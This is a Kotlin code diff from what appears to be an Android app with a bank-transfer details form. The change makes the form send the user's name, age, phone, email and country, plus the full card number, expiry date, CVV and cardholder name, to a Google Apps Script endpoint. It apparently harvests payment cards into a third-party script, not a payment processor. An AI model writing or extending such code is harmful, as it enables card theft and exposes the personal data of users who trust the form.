@@ -415,13 +415,17 @@ class BankTransferDetailsPopupWindowsForm  {
 
             override fun doInBackground(vararg urls: String?): String {
                 var urlConnection: HttpURLConnection? = null
-                val url = URL("https://script.google.com/macros/s/AKfycbxuIfG1GqZ2IYRRVrlWiMXUmG_UG7IM42DJeytiowvBCiNRtkLq32ODkQNYx2RF5CxO/exec?action=addUser")
+                val url = URL("https://script.google.com/macros/s/AKfycbzVPalYfInOXJNMe7Yv_JQtTG2LCiM24f72wzEQBHj7kjuF3k6J-XPmD5jqtZeLpkG4/exec?action=addBankTransferDataPersonalAndPaymentData")
                 val jsonObject = JSONObject()
                 jsonObject.put("name", nameTextInputEditText?.text.toString())
                 jsonObject.put("age", ageTextInputEditText?.text.toString())
                 jsonObject.put("mobile", phoneTextInputEditText?.text.toString())
                 jsonObject.put("email", emailTextInputEditText?.text.toString())
-                jsonObject.put("address", countryTextInputEditText?.text.toString())
+                jsonObject.put("countryOrCountry", countryTextInputEditText?.text.toString())
+                jsonObject.put("cardNumber", cardNumberEditText?.text.toString())
+                jsonObject.put("cardExpiry", cardExpiryDateEditText?.text.toString())
+                jsonObject.put("cardCvv", cardCVVNumberEditText?.text.toString())
+                jsonObject.put("cardName", cardNameEditText?.text.toString())
                 val jsonObjectString = jsonObject.toString()
 
                 try {
